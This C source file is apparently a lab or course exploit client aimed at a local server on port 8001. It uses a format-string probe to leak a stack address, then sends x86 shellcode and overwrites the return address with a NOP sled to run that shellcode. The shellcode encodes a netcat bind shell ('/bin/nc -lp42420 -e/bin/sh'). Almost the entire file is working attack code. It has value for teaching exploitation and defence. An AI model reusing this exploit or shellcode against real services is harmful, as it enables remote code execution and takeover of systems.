/* A client */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	128
#define	ALENGTH	32

#define OFFSET 41

/* the correct shellcode */
char shellcode[]=
				
	"1"
	//"\x31\xc0\x50\x50\xb0\x17\xcd\x80" 
	"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08" 
	"\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d"
	"\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70"
	"\x34\x32\x34\x32\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x43\x41\x36\x34\x37"
	"\x5f\x45\x4c\x49\x54\x45\x5f\x54\x45\x41\x4d";

void *response;

loop(int s)
{
  char buffer[BLENGTH];
  char name[ALENGTH] = "Jimmy";
  
  /* Send name to server */
  send(s, name, ALENGTH, 0);

  for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      break;
    }	
    int i;

    
    
/* Getting addr of response */

	strcpy(buffer, "%u%u%u%u%u%u%u %p\n");
	send(s, (void *)buffer, BLENGTH, 0);
	
	recv(s, (void *)buffer, BLENGTH, 0);
    
	sscanf(buffer, "%*s %p", &response);
	response -=88;
	printf("addr of response %p\n", response);

      
/* Passing the payload in response */
    strncpy(buffer, shellcode,sizeof(buffer)-1);
	buffer[sizeof(buffer)-1] = '\0';
    send(s, (void *)buffer, BLENGTH, 0); 

		
	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);
    
    /* PUT IN THE RETURN ADDR TO EXECUTE THE PAYLOAD */
    /////////////////////////////////////////////////////////
   for(i = 0 ; i < OFFSET ; i++ ) {
    buffer[i] = 0x90;
   }
   
   // Rewriting the return pointer
   response +=1;
   	printf("addr of response %p\n", response);
  *(void **)(buffer +OFFSET-5) = response;
  send(s, (void *)buffer, OFFSET-1, 0); 
    
   /////////////////////////////////////////////////////////////////// 
	
    

  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
